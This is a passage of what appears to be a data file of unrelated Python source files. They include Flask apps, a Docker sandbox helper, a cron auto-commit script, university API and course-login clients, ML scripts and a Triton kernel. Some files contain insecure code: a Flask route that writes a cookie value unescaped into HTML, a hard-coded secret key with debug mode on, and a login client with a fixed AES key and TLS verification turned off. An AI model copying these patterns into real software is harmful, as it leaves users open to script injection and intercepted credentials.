ui_element in ['Jurnal', '\u2190', '\u2192', '%', '\u00a9', 'Back']):\n            continue\n            \n        if \"Kegiatan:\" in line:\n            in_kegiatan = True\n            continue\n        elif \"Target Pencapaian:\" in line:\n            in_kegiatan = False\n            if isinstance(current_entry[\"Kegiatan\"], list):\n                current_entry[\"Kegiatan\"] = ' '.join(current_entry[\"Kegiatan\"])\n            continue\n        elif \"Selesai\" in line:\n            current_entry[\"Target Pencapaian\"] = \"Selesai\"\n            continue\n            \n        if in_kegiatan and line and not line.isspace():\n            if isinstance(current_entry[\"Kegiatan\"], str):\n                current_entry[\"Kegiatan\"] = [current_entry[\"Kegiatan\"]]\n            current_entry[\"Kegiatan\"].append(line)\n    \n    if current_entry[\"Kegiatan\"]:\n        current_entry[\"Kegiatan\"] = ' '.join(current_entry[\"Kegiatan\"]) if isinstance(current_entry[\"Kegiatan\"], list) else current_entry[\"Kegiatan\"]\n        entries.append(current_entry)\n    \n    return entries\n\ndef main():\n    csv_filename = \"logs.csv\"\n    csv_exists = os.path.exists(csv_filename)\n    \n    with open(csv_filename, mode='a', newline='', encoding='utf-8') as csvfile:\n        fieldnames = [\"Tanggal\", \"Kegiatan\", \"Target Pencapaian\"]\n        ",
    "from typing import Type\nimport docker\n\nimport os\n\nfrom . import utils\nfrom .images import IMAGES, Python, Ubuntu, Container\nfrom .utils_types import Image\n\n\n__all__ = ['build', 'run', 'get_container', 'Image', 'Container', 'Python', 'Ubuntu']\n\n\nlib_path = '/'.join(__file__.split('/')[:-1])\n\n\ndef build(dockerfile: Type[IMAGES], path: str=f'{lib_path}/', suffix_len: int=16) -> Image:\n    tag = f'di-{dockerfile.get_dockerfile_path()}-{utils.generate_random_hex(suffix_len)}'\n    client = docker.from_env()\n    image, build_logs = client.images.build(path=path,\n                                            dockerfile=f'{lib_path}/docker_images/{dockerfile.get_dockerfile_path()}',\n                                            tag=tag)\n    return Image(image=dockerfile, tag=tag, build_logs=build_logs)\n\n\ndef run(image: Image, start_command='', mem='500M', nano_cpus=10000000) -> IMAGES:\n    client = docker.from_env()\n    container = client.containers.run(\n        image.tag,\n        name=f'sandbox-{utils.generate_random_hex(16)}',\n        detach=True,\n        command=start_command,\n        nano_cpus=nano_cpus,\n        mem_limit=mem,\n        network_mode=\"none\",\n        tty=True,  # \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u043f\u0441\u0435\u0432\u0434\u043e\u0442\u0435\u0440\u043c\u0438\u043d\u0430\u043b\u0430\n        stdin_open=True\n\n    )\n    return image.image(container=container)\n\n\ndef get_container(container_id: str, image: Type[IMAGES]=None) -> IMAGES | Container:\n    client = docker.from_env()\n    container = client.containers.get(container_id)\n    if image:\n        return image(container=container)\n    else:\n        return Container(container=container)\n\n\n",
    "#!/usr/bin/env python3\nimport os\nimport random\nimport subprocess\nfrom datetime import datetime\n\nscript_dir = os.path.dirname(os.path.abspath(__file__))\nos.chdir(script_dir)\n\n\ndef read_number():\n    with open(\"number.txt\", \"r\") as f:\n        return int(f.read().strip())\n\n\ndef write_number(num):\n    with open(\"number.txt\", \"w\") as f:\n        f.write(str(num))\n\n\ndef generate_random_commit_message():\n    from transformers import pipeline\n\n    generator = pipeline(\n        \"text-generation\",\n        model=\"openai-community/gpt2\",\n    )\n    prompt = \"\"\"\n        Generate a Git commit message following the Conventional Commits standard. The message should include a type, an optional scope, and a subject.Please keep it short. Here are some examples:\n\n        - feat(auth): add user authentication module\n        - fix(api): resolve null pointer exception in user endpoint\n        - docs(readme): update installation instructions\n        - chore(deps): upgrade lodash to version 4.17.21\n        - refactor(utils): simplify date formatting logic\n\n        Now, generate a new commit message:\n    \"\"\"\n    generated = generator(\n        prompt,\n        max_new_tokens=50,\n        num_return_sequences=1,\n        temperature=0.9,  # Slightly higher for creativity\n        top_k=50,  # Limits sampling to top 50 logits\n        top_p=0.9,  # Nucleus sampling for diversity\n        truncation=True,\n    )\n    text = generated[0][\"generated_text\"]\n\n    if \"- \" in text:\n        return text.rsplit(\"- \", 1)[-1].strip()\n    else:\n        raise ValueError(f\"Unexpected generated text {text}\")\n\n\ndef git_commit():\n    # Stage the changes\n    subprocess.run([\"git\", \"add\", \"number.txt\"])\n    # Create commit with current date\n    if \"FANCY_JOB_USE_LLM\" in os.environ:\n        commit_message = generate_random_commit_message()\n    else:\n        date = datetime.now().strftime(\"%Y-%m-%d\")\n        commit_message = f\"Update number: {date}\"\n    subprocess.run([\"git\", \"commit\", \"-m\", commit_message])\n\n\ndef git_push():\n    # Push the committed changes to GitHub\n    result = subprocess.run([\"git\", \"push\"], capture_output=True, text=True)\n    if result.returncode == 0:\n        print(\"Changes pushed to GitHub successfully.\")\n    else:\n        print(\"Error pushing to GitHub:\")\n        print(result.stderr)\n\n\ndef update_cron_with_random_time():\n    # Generate random hour (0-23) and minute (0-59)\n    random_hour = random.randint(0, 23)\n    random_minute = random.randint(0, 59)\n\n    # Define the new cron job command\n    new_cron_command = f\"{random_minute} {random_hour} * * * cd {script_dir} && python3 {os.path.join(script_dir, 'update_number.py')}\\n\"\n\n    # Get the current crontab\n    cron_file = \"/tmp/current_cron\"\n    os.system(\n        f\"crontab -l > {cron_file} 2>/dev/null || true\"\n    )  # Save current crontab, or create a new one if empty\n\n    # Update the crontab file\n    with open(cron_file, \"r\") as file:\n        lines = file.readlines()\n\n    with open(cron_file, \"w\") as file:\n        for line in lines:\n            # Remove existing entry for `update_number.py` if it exists\n            if \"update_number.py\" not in line:\n                file.write(line)\n        # Add the new cron job at the random time\n        file.write(new_cron_command)\n\n    # Load the updated crontab\n    os.system(f\"crontab {cron_file}\")\n    os.remove(cron_file)\n\n    print(f\"Cron job updated to run at {random_hour}:{random_minute} tomorrow.\")\n\n\ndef main():\n    try:\n        current_number = read_number()\n        new_number = current_number + 1\n        write_number(new_number)\n        git_commit()\n        git_push()\n        update_cron_with_random_time()\n    except Exception as e:\n        print(f\"Error: {str(e)}\")\n        exit(1)\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "from flask import Flask, render_template,request,make_response,abort,flash\nfrom datetime import datetime\nfrom werkzeug.utils import secure_filename                                #to get secure file name\n\napp = Flask(__name__,template_folder=\"templates\")                   #see templates folder for html pages\n\napp.secret_key=\"mysecretkey\"                               \n@app.route(\"/\")                                                     #render this for empty routes\ndef home():\n    return render_template(\"index.html\")\n    \n@app.route(\"/about\")                                                #about route\ndef about():\n    current_time=datetime.now()\n    return render_template(\"about.html\", current_time=current_time)\n\n@app.route(\"/form\",methods=[\"POST\",\"GET\"])                           #route accepts data only from GET method here POST is explicitly accepted\ndef form():\n    error=None\n    if request.method ==\"POST\":                                      #for POST requests(when user submits the form a post requst is sent with form data)\n        print(request.form )                                         #request.form get data from form if form uses post or put method\n                                                                     #if form uses get method then request.args should be used\n        name=request.form [\"name\"]\n        email=request.form [\"email\"]\n        print(name,email)                                            #output to terminal\n        print(f\"Name: {name}, Email: {email}\")\n        f=request.files[\"file\"]                                      #get form data\n        f.save(secure_filename(f.filename))                          #ensures the file name is secure and save it\n        if request.form[\"name\"] == \"sava\" and request.form[\"email\"] == \"savandikodithuwakku@gmail.com\":\n            flash(\"User logged in successfully\")\n            return render_template(\"show.html\", name=name, mail=email) \n        else:\n            # abort(401)                                             #UNauthorized error msg \n            error=\"Invalid username or password\"\n    #else:\n    return render_template(\"form.html\",error=error)                  #for GET requests(from index.html it directs to form.html)\n\n@app.route('/set')\ndef set():\n    return render_template('setcookie.html')\n\n@app.route('/setcookie',methods=['POST','GET'])                      #setting the cookie\ndef setcookie():\n    if request.method=='POST':\n        user=request.form['nm']\n        resp=make_response(render_template('readcookie.html'))       #resp is a response object. It creates a response object from the readcookie page    \n        resp.set_cookie('userID',user)                               #add cookie details as a response header which instruct the user to save the cookie\n        return resp                             #return resp(setcookie header+readcookie page) to save the cookie in browser and return to readcookie page\n\n@app.route('/getcookie')                                             #getting the cookie\ndef getcookie():    \n    name=request.cookies.get('userID')                               #request.cookies.get('userID') returns the value of userID\n    return '<h1>welcome '+name+'</h1>'\n\nif __name__ == \"__main__\":\n    app.run(host=\"127.0.0.1\", port=5000, debug=True)                 #run the app by starting the server\n",
    "import os\nimport requests\nimport yaml\n\n\ndef load_config():\n    current_dir = os.path.dirname(os.path.abspath(__file__))\n    config_path = os.path.join(current_dir, \"config.yaml\")\n\n    with open(config_path, \"r\", encoding=\"utf-8\") as f:\n        return yaml.safe_load(f)\n\n\ndef query_card_trade_list(begin_date, end_date, trade_type=1):\n    config = load_config()\n\n    url = \"https://ydapp.bjut.edu.cn/selftrade/queryCardSelfTradeList\"\n    params = {\n        \"beginDate\": begin_date,\n        \"endDate\": end_date,\n        \"tradeType\": trade_type,\n        \"openid\": config[\"user\"][\"openid\"],\n        \"orgid\": \"2\",\n    }\n\n    headers = {\n        \"Host\": \"ydapp.bjut.edu.cn\",\n        \"Connection\": \"keep-alive\",\n        \"isWechatApp\": \"true\",\n        \"sec-ch-ua-platform\": '\"Android\"',\n        \"session-type\": \"uniapp\",\n        \"sec-ch-ua\": '\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"',\n        \"sec-ch-ua-mobile\": \"?1\",\n        \"x-requested-with\": \"XMLHttpRequest\",\n        \"orgid\": \"2\",\n        \"User-Agent\": \"Mozilla/5.0 (Linux; Android 14; PJR110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36 ZhilinEai ZhilinBjutApp/2.5 OPPO PJR110 Android 14 AgentWeb/5.0.8  UCBrowser/11.6.4.950\",\n        \"content-type\": \"application/json\",\n        \"Accept\": \"*/*\",\n        \"Sec-Fetch-Site\": \"same-origin\",\n        \"Sec-Fetch-Mode\": \"cors\",\n        \"Sec-Fetch-Dest\": \"empty\",\n        \"Referer\": \"https://ydapp.bjut.edu.cn/\",\n        \"Accept-Encoding\": \"gzip, deflate, br, zstd\",\n        \"Accept-Language\": \"zh-CN,zh;q=0.9,ja-JP;q=0.8,ja;q=0.7,en-US;q=0.6,en;q=0.5\",\n        \"Cookie\": config[\"user\"][\"cookie\"],\n    }\n\n    try:\n        response = requests.get(\n            url, params=params, headers=headers, verify=True, stream=True\n        )\n        response.raw.decode_content = True\n        response.raise_for_status()\n        return response.json()\n\n    except requests.exceptions.RequestException as e:\n        print(f\"\u8bf7\u6c42\u9519\u8bef: {e}\")\n        return None\n    except ValueError as e:\n        print(f\"JSON\u89e3\u6790\u9519\u8bef: {e}\")\n        print(\"\u54cd\u5e94\u5185\u5bb9:\", response.text)\n        return None\n\n\nif __name__ == \"__main__\":\n    # Test Example\n    begin_date = \"2024-12-01\"\n    end_date = \"2025-01-01\"\n\n    result = query_card_trade_list(begin_date, end_date)\n\n    if result:\n        import json\n\n        print(json.dumps(result, ensure_ascii=False, indent=2))\n",
    "# Copyright (c) 2024, Tri Dao.\n# Modifications (c) 2024 Amazon.com, Inc. or its affiliates. All Rights Reserved.\n# SPDX-License-Identifier: Apache-2.0\n# Implement dropout + residual + layer_norm / rms_norm.\n\n# Based on the Triton LayerNorm tutorial: https://triton-lang.org/main/getting-started/tutorials/05-layer-norm.html\n# For the backward pass, we keep weight_grad and bias_grad in registers and accumulate.\n# This is faster for dimensions up to 8k, but after that it's much slower due to register spilling.\n# The models we train have hidden dim up to 8k anyway (e.g. Llama 70B), so this is fine.\n\nimport math\n\nimport torch\nimport torch.nn.functional as F\nfrom torch.cuda.amp import custom_fwd, custom_bwd\n\nimport triton\nimport triton.language as tl\n\n\ndef layer_norm_ref(\n    x,\n    weight,\n    bias,\n    residual=None,\n    x1=None,\n    weight1=None,\n    bias1=None,\n    eps=1e-6,\n    dropout_p=0.0,\n    rowscale=None,\n    prenorm=False,\n    dropout_mask=None,\n    dropout_mask1=None,\n    upcast=False,\n):\n    dtype = x.dtype\n    if upcast:\n        x = x.float()\n        weight = weight.float()\n        bias = bias.float() if bias is not None else None\n        residual = residual.float() if residual is not None else residual\n        x1 = x1.float() if x1 is not None else None\n        weight1 = weight1.float() if weight1 is not None else None\n        bias1 = bias1.float() if bias1 is not None else None\n    if x1 is not None:\n        assert rowscale is None, \"rowscale is not supported with parallel LayerNorm\"\n    if rowscale is not None:\n        x = x * rowscale[..., None]\n    if dropout_p > 0.0:\n        if dropout_mask is not None:\n            x = x.masked_fill(~dropout_mask, 0.0) / (1.0 - dropout_p)\n        else:\n            x = F.dropout(x, p=dropout_p)\n        if x1 is not None:\n            if dropout_mask1 is not None:\n                x1 = x1.masked_fill(~dropout_mask1, 0.0) / (1.0 - dropout_p)\n            else:\n                x1 = F.dropout(x1, p=dropout_p)\n    if x1 is not None:\n        x = x + x1\n    if residual is not None:\n        x = (x + residual).to(x.dtype)\n    out = F.layer_norm(x.to(weight.dtype), x.shape[-1:], weight=weight, bias=bias, eps=eps).to(\n        dtype\n    )\n    if weight1 is None:\n        return out if not prenorm else (out, x)\n    else:\n        out1 = F.layer_norm(\n            x.to(weight1.dtype), x.shape[-1:], weight=weight1, bias=bias1, eps=eps\n        ).to(dtype)\n        return (out, out1) if not prenorm else (out, out1, x)\n\n\ndef rms_norm_ref(\n    x,\n    weight,\n    bias,\n    residual=None,\n    x1=None,\n    weight1=None,\n    bias1=None,\n    eps=1e-6,\n    dropout_p=0.0,\n    rowscale=None,\n    prenorm=False,\n    dropout_mask=None,\n    dropout_mask1=None,\n    upcast=False,\n):\n    dtype = x.dtype\n    if upcast:\n        x = x.float()\n        weight = weight.float()\n        bias = bias.float() if bias is not None else None\n        residual = residual.float() if residual is not None else residual\n        x1 = x1.float() if x1 is not None else None\n        weight1 = weight1.float() if weight1 is not None else None\n        bias1 = bias1.float() if bias1 is not None else None\n    if x1 is not None:\n        assert rowscale is None, \"rowscale is not supported with parallel LayerNorm\"\n    if rowscale is not None:\n        x = x * rowscale[..., None]\n    if dropout_p > 0.0:\n        if dropout_mask is not None:\n            x = x.masked_fill(~dropout_mask, 0.0) / (1.0 - dropout_p)\n        else:\n            x = F.dropout(x, p=dropout_p)\n        if x1 is not None:\n            if dropout_mask1 is not None:\n                x1 = x1.masked_fill(~dropout_mask1, 0.0) / (1.0 - dropout_p)\n            else:\n                x1 = F.dropout(x1, p=dropout_p)\n    if x1 is not None:\n        x = x + x1\n    if residual is not None:\n        x = (x + residual).to(x.dtype)\n    rstd = 1 / torch.sqrt((x.square()).mean(dim=-1, keepdim=True) + eps)\n    out = ((x * rstd * weight) + bias if bias is not None else (x * rstd * weight)).to(dtype)\n    if weight1 is None:\n        return out if not prenorm else (out, x)\n    else:\n        out1 = ((x * rstd * weight1) + bias1 if bias1 is not None else (x * rstd * weight1)).to(\n            dtype\n        )\n        return (out, out1) if not prenorm else (out, out1, x)\n\n\n@triton.autotune(\n    configs=[\n        triton.Config({}, num_warps=1),\n        triton.Config({}, num_warps=2),\n        triton.Config({}, num_warps=4),\n        triton.Config({}, num_warps=8),\n        triton.Config({}, num_warps=16),\n        triton.Config({}, num_warps=32),\n    ],\n    key=[\"N\", \"HAS_RESIDUAL\", \"STORE_RESIDUAL_OUT\", \"IS_RMS_NORM\", \"HAS_BIAS\"],\n)\n# @triton.heuristics({\"HAS_BIAS\": lambda args: args[\"B\"] is not None})\n# @triton.heuristics({\"HAS_RESIDUAL\": lambda args: args[\"RESIDUAL\"] is not None})\n@triton.heuristics({\"HAS_X1\": lambda args: args[\"X1\"] is not None})\n@triton.heuristics({\"HAS_W1\": lambda args: args[\"W1\"] is not None})\n@triton.heuristics({\"HAS_B1\": lambda args: args[\"B1\"] is not None})\n@triton.jit\ndef _lay",
    "from flask import Flask, request, jsonify\r\nfrom flask_cors import CORS\r\nimport logging\r\nimport requests\r\nimport os\r\n\r\n# Configure logging\r\nlogging.basicConfig(\r\n    level=logging.INFO,\r\n    format='%(asctime)s - %(levelname)s - %(message)s'\r\n)\r\nlogger = logging.getLogger(__name__)\r\n\r\napp = Flask(__name__)\r\nCORS(app)\r\n\r\nAPI_TOKEN = os.getenv(\"API_KEY\")  # Fetch the API key from Vercel's environment variables\r\nif not API_TOKEN:\r\n    raise ValueError(\"API Key not found! Make sure to set the API_KEY environment variable in your Vercel project settings.\")\r\n    \r\nAPI_KEY = API_TOKEN\r\nBASE_URL = \"https://api.indiankanoon.org\"\r\n\r\ndef get_headers():\r\n    return {\r\n        'Authorization': f\"Token {API_KEY}\",\r\n        'Content-Type': 'application/x-www-form-urlencoded'\r\n    }\r\n\r\n@app.route('/search/', methods=['POST'])\r\ndef search():\r\n    try:\r\n        data = request.get_json()\r\n        query = data.get('formInput')\r\n        pagenum = data.get('pagenum', 0)\r\n\r\n        if not query:\r\n            return jsonify({'error': 'Query parameter is required'}), 400\r\n\r\n        url = f\"{BASE_URL}/search/\"\r\n        payload = {\r\n            'formInput': query,\r\n            'pagenum': pagenum\r\n        }\r\n\r\n        response = requests.post(url, data=payload, headers=get_headers())\r\n        response.raise_for_status()\r\n        return jsonify(response.json())\r\n\r\n    except Exception as e:\r\n        logger.error(f\"Search error: {str(e)}\")\r\n        return jsonify({'error': str(e)}), 500\r\n\r\n@app.route('/doc/<docid>/', methods=['POST'])\r\ndef get_document(docid):\r\n    try:\r\n        url = f\"{BASE_URL}/doc/{docid}/\"\r\n        response = requests.post(url, headers=get_headers())\r\n        response.raise_for_status()\r\n        return jsonify(response.json())\r\n\r\n    except Exception as e:\r\n        logger.error(f\"Document fetch error: {str(e)}\")\r\n        return jsonify({'error': str(e)}), 500\r\n\r\nif __name__ == '__main__':\r\n    app.run(debug=True, port=5000)\r\n",
    "import torch\nimport numpy as np\nfrom sklearn.ensemble import RandomForestClassifier\nfrom sklearn.metrics import accuracy_score, classification_report\nfrom cnn import GuavaDiseaseClassifier, load_guava_dataset\n\ndevice = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\n\n\n# Load the pretrained CNN model\ndef load_pretrained_model(model_path=\"pretrained_cnn.pth\"):\n    model = GuavaDiseaseClassifier()\n    # Map the model to the appropriate device (CPU in this case)\n    model.load_state_dict(torch.load(model_path, map_location=torch.device(\"cpu\"), weights_only=True))\n    model.eval()  # Set to evaluation mode\n    print(f\"Loaded pretrained model from {model_path} onto CPU\")\n    return model\n\n\n# Extract features using the CNN\ndef extract_features(data_loader, model, device):\n    features = []\n    labels = []\n    with torch.no_grad():\n        for images, label_batch in data_loader:\n            images = images.to(device)\n            # Forward pass up to the feature extraction layer, excluding fully connected layers\n            embeddings = model.layers[:-4](images)\n            features.append(embeddings.cpu().numpy())\n            labels.extend(label_batch.numpy())\n    return np.vstack(features), np.array(labels)\n\n\ndef train_random_forest(X_train, y_train):\n    rf = RandomForestClassifier(n_estimators=100, random_state=42)\n    rf.fit(X_train, y_train)\n    print(\"Random Forest model trained.\")\n    return rf\n\n\ndef evaluate_random_forest(rf, X_test, y_test):\n    y_pred = rf.predict(X_test)\n    accuracy = accuracy_score(y_test, y_pred)\n    print(\"Random Forest Accuracy:\", accuracy)\n    print(\"\\nClassification Report:\")\n    print(classification_report(y_test, y_pred, target_names=[\"Anthracnose\", \"Fruit Fly\", \"Healthy Guava\"]))\n    return accuracy\n\n\ndef main():\n    print(\"Initializing...\")\n    device = torch.device(\"cuda\" if torch.cuda.is_available() else \"mps\" if torch.mps.is_available() else \"cpu\")  # use cpu only if better hardware not available\n    model = load_pretrained_model().to(device=device)\n\n    print(\"Loading dataset...\")\n    training_data, test_data = load_guava_dataset()\n\n    print(\"Extracting features...\")\n    X_train, y_train = extract_features(training_data, model, device)\n    X_test, y_test = extract_features(test_data, model, device)\n    print(\"Feature extraction complete.\")\n\n    print(\"Training Random Forest classifier...\")\n    rf = train_random_forest(X_train, y_train)\n\n    print(\"Evaluating Random Forest classifier...\")\n    evaluate_random_forest(rf, X_test, y_test)\n\n    print(\"Done.\")\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "#Step 1: Importing Libraries and Loading the Dataset\r\nimport pandas as pd\r\nimport numpy as np\r\nimport seaborn as sns\r\nimport matplotlib.pyplot as plt\r\nfrom sklearn.model_selection import train_test_split\r\nfrom sklearn.linear_model import LinearRegression\r\nfrom sklearn.metrics import mean_squared_error, r2_score\r\n#Load the Iris dataset from seaborn\r\niris = sns.load_dataset('iris')\r\n#Display the first few rows of the dataset\r\nprint(iris.head())\r\n\r\n#Step 2: Exploratory Data Analysis (EDA)\r\n#Describe the dataset\r\nprint(iris.describe())\r\n#Visualise pairplot to see relationships\r\nsns.pairplot(iris, hue='species')\r\nplt.show()\r\n#Visualise the distribution of each feature\r\nfor column in iris.columns[:-1]:  # excluding 'species'\r\n    plt.figure()\r\n    sns.histplot(iris[column], kde=True)\r\n    plt.title(f'Distribution of {column}')\r\n    plt.show()\r\n#Check for any missing values\r\nprint(iris.isnull().sum())\r\n\r\n#Step 3: Data Preprocessing\r\n#Convert categorical variable 'species' to numerical using one-hot encoding\r\niris = pd.get_dummies(iris, columns=['species'], drop_first=True)\r\n#Define the feature matrix X and target vector Y\r\nX = iris.drop(columns=['species_versicolor', 'species_virginica'])\r\ny = iris['species_versicolor']  # Example: Predicting 'species_versicolor'\r\n#Split the data into training and testing sets\r\nX_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=42)\r\n\r\n#Step 4: Train the Linear Regression Model\r\n#Initialise and train the model\r\nlr_model = LinearRegression()\r\nlr_model.fit(X_train, y_train)\r\n#Predict on the test data\r\ny_pred = lr_model.predict(X_test)\r\n\r\n#Step 5: Model Evaluation\r\n#Calculate mean squared error and R2 score\r\nmse = mean_squared_error(y_test, y_pred)\r\nr2 = r2_score(y_test, y_pred)\r\nprint(f\"Mean Squared Error: {mse}\")\r\nprint(f\"R2 Score: {r2}\")\r\n#Simple plot of actual vs predicted values\r\nplt.figure()\r\nplt.plot(y_test.values, label='Actual Values', marker='o')\r\nplt.plot(y_pred, label='Predicted Values', marker='x')\r\nplt.xlabel('Sample Index')\r\nplt.ylabel('Species Versicolor')\r\nplt.title('Actual vs Predicted Values')\r\nplt.legend()\r\nplt.show()",
    "app_name = \"paystack_terminal\"\napp_title = \"Paystack Terminal\"\napp_publisher = \"Gemutanalytics\"\napp_description = \"Paystack Terminal Integration for ERPNext Healthcare\"\napp_email = \"dev@gemutanalytics.com\"\napp_license = \"MIT\"\n\n# DocTypes to be registered\ndoctype_list = [\"Paystack Settings\"]\n\n# Module configuration\nmodules = {\n    \"Paystack Terminal\": {\n        \"color\": \"#25c16f\",\n        \"icon\": \"octicon octicon-credit-card\",\n        \"type\": \"module\",\n        \"label\": \"Paystack Terminal\",\n        \"category\": \"Modules\"\n    }\n}\n\n# include js, css files in header of desk.html\napp_include_js = [\n    \"/assets/paystack_terminal/js/paystack_terminal.js\"\n]\n\n# Doc Events\ndoc_events = {\n    \"Payment Entry\": {\n        \"on_submit\": \"paystack_terminal.api.update_payment_status\"\n    }\n}\n\n# Custom fields to be created\nfixtures = [\n    {\n        \"dt\": \"Custom Field\",\n        \"filters\": [\n            [\"name\", \"in\", [\n                \"Customer-paystack_customer_code\",\n                \"Payment Entry-paystack_reference\",\n                \"Sales Invoice-terminal_reference\",\n                \"Sales Invoice-paystack_status\"\n            ]]\n        ]\n    },\n    {\n        \"dt\": \"DocType\",\n        \"filters\": [[\"name\", \"in\", [\"Paystack Settings\"]]]\n    },\n    {\n        \"dt\": \"Mode of Payment\",\n        \"filters\": [[\"name\", \"=\", \"Paystack Terminal\"]],\n        \"records\": [{\n            \"doctype\": \"Mode of Payment\",\n            \"mode_of_payment\": \"Paystack Terminal\",\n            \"type\": \"Bank\",\n            \"enabled\": 1\n        }]\n    }\n]\n\n# DocType JS\ndoctype_js = {\n    \"Sales Invoice\": \"public/js/sales_invoice.js\"\n}\n\n# Webhooks\nwebhooks = [\n    {\n        \"webhook\": \"Paystack Terminal Webhook\",\n        \"url\": \"/api/method/paystack_terminal.api.handle_webhook\",\n        \"request_method\": \"POST\"\n    }\n]\n\n# Schedule Tasks for reconciliation\nscheduler_events = {\n    \"daily\": [\n        \"paystack_terminal.api.reconcile_pending_payments\"\n    ]\n}",
    "\"\"\"Workspace manager module for handling file operations and codebase management.\"\"\"\n\n# pylama:ignore=E501,C901,E125,E251\nimport hashlib\nimport logging\nimport math\nimport mmap\nimport os\nimport re\nimport threading\nimport time\nfrom collections import Counter, defaultdict\nfrom concurrent.futures import ThreadPoolExecutor\nfrom dataclasses import dataclass\nfrom pathlib import Path\nfrom typing import Any, Dict, List, Optional, Set, Tuple, Union\n\n\n@dataclass\nclass Document:\n    path: str\n    content: str\n    term_freqs: Counter\n    length: int\n\n\nclass BM25Search:\n\n    def __init__(self, k1: float = 1.5, b: float = 0.75):\n        self.k1 = k1  # Term frequency scaling parameter\n        self.b = b  # Length normalization parameter\n        self.documents: Dict[str, Document] = {}\n        self.avg_doc_length: float = 0\n        self.total_docs: int = 0\n        self.idf_cache: Dict[str, float] = {}\n        self.tokenizer_pattern = re.compile(r\"\\w+|[^\\w\\s]\")\n        self._lock = threading.Lock()\n\n        # Initialize logging\n        self.logger = logging.getLogger(\"BM25Search\")\n        self.logger.setLevel(logging.DEBUG)\n\n    def preprocess(self, text: str) -> List[str]:\n        \"\"\"Tokenize and normalize text\"\"\"\n        # Convert to lowercase and tokenize\n        tokens = self.tokenizer_pattern.findall(text.lower())\n        # Filter out single character tokens except if they're special\n        # characters\n        return [t for t in tokens if len(t) > 1 or not t.isalnum()]\n\n    def add_document(self, path: str, content: str) -> None:\n        \"\"\"Add a document to the search index\"\"\"\n        with self._lock:\n            # Preprocess content\n            tokens = self.preprocess(content)\n            # Create document object\n            doc = Document(\n                path=path,\n                content=content,\n                term_freqs=Counter(tokens),\n                length=len(tokens),\n            )\n\n            # Update index\n            self.documents[path] = doc\n\n            # Update average document length\n            self.total_docs = len(self.documents)\n            total_length = sum(doc.length for doc in self.documents.values())\n            self.avg_doc_length = (total_length / self.total_docs\n                                   if self.total_docs > 0 else 0)\n\n            # Clear IDF cache as it needs to be recalculated\n            self.idf_cache.clear()\n\n    def remove_document(self, path: str) -> None:\n        \"\"\"Remove a document from the search index\"\"\"\n        with self._lock:\n            if path in self.documents:\n                del self.documents[path]\n                self.total_docs = len(self.documents)\n                if self.total_docs > 0:\n                    total_length = sum(doc.length\n                                       for doc in self.documents.values())\n                    self.avg_doc_length = total_length / self.total_docs\n                else:\n                    self.avg_doc_length = 0\n                self.idf_cache.clear()\n\n    def _calculate_idf(self, term: str) -> float:\n        \"\"\"Calculate Inverse Document Frequency for a term\"\"\"\n        if term in self.idf_cache:\n            return self.idf_cache[term]\n\n        # Count documents containing the term\n        doc_freq = sum(1 for doc in self.documents.values()\n                       if term in doc.term_freqs)\n\n        # Calculate IDF with smoothing\n        idf = math.log(1 + (self.total_docs - doc_freq + 0.5) /\n                       (doc_freq + 0.5))\n        self.idf_cache[term] = idf\n        return idf\n\n    def search(self,\n               query: str,\n               top_k: int = 10) -> List[Tuple[str, float, str]]:\n        \"\"\"Search for documents matching the query\"\"\"\n        start_time = time.time()\n        self.logger.debug(f\"Starting search for query: {query}\")\n\n        # Preprocess query\n        query_terms = self.preprocess(query)\n        scores: Dict[str, float] = defaultdict(float)\n\n        # Calculate scores for each document\n        for path, doc in self.documents.items():\n            score = 0.0\n            doc_len_norm = 1 - self.b + self.b * \\\n                (doc.length / self.avg_doc_length)\n\n            for term in query_terms:\n                if term in doc.term_freqs:\n                    tf = doc.term_freqs[term]\n                    idf = self._calculate_idf(term)\n\n                    # BM25 scoring formula\n                    term_score = (idf * tf * (self.k1 + 1) /\n                                  (tf + self.k1 * doc_len_norm))\n                    score += term_score\n\n            if score > 0:\n                scores[path] = score\n\n        # Sort results by score\n        results = []\n        for path, score in sorted(scores.items(),\n                                  key=lambda x: x[1],\n                                  reverse=True)[:top_k]:\n            doc = self.documents[path]\n            # Get a relevant snippet from the content\n            snippet = self._get_relevant_snippet(doc.content, query_terms)\n           ",
    "'''\nAuthor: wlaten\nDate: 2025-01-01 18:06:37\nLastEditTime: 2025-01-04 13:34:30\nDiscription: file content\n'''\n\nimport requests\nimport logging\nimport yaml\nfrom urllib.parse import urlencode\nfrom utils.aes_util import AesUtil\nfrom utils.helpers import console\nfrom utils.config_handler import load_last_selection\nimport time\nfrom Crypto.Cipher import AES\nfrom captcha import verify as captcha_verify\nfrom utils.helpers import clear_screen\n\nclass XMULogin:\n    def __init__(self, config_path='config/user.yaml'):\n        self.session = requests.Session()\n        self.token = None\n        self.aesutil = AesUtil('MWMqg2tPcDkxcm11')  # \u56fa\u5b9a\u5bc6\u94a5\n        self.batch_id = None\n\n        try:\n            self.session.get('https://xk.xmu.edu.cn/xsxkxmu/profile/index.html', verify=False)\n        except Exception as e:\n            logging.warning(f\"\u521d\u59cb\u8bbf\u95ee\u9996\u9875\u5931\u8d25: {str(e)}\")\n\n        self.session.headers.update({\n            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',\n            'Accept': 'application/json, text/plain, */*',\n            'Accept-Language': 'zh-CN,zh;q=0.9',\n            'Origin': 'https://xk.xmu.edu.cn',\n            'Referer': 'https://xk.xmu.edu.cn/xsxkxmu/profile/index.html',\n            'Content-Type': 'application/x-www-form-urlencoded'\n        })\n        self.load_config(config_path)\n\n    def load_config(self, config_path):\n        \"\"\"\u52a0\u8f7d\u914d\u7f6e\u6587\u4ef6\"\"\"\n        try:\n            with open(config_path, 'r', encoding='utf-8') as f:\n                config = yaml.safe_load(f)\n                self.username = config['username']\n                self.password = config['password']\n                self.campus = config.get('campus', '6')\n                self.captcha_auto = config.get('captcha_auto', False)\n                \n                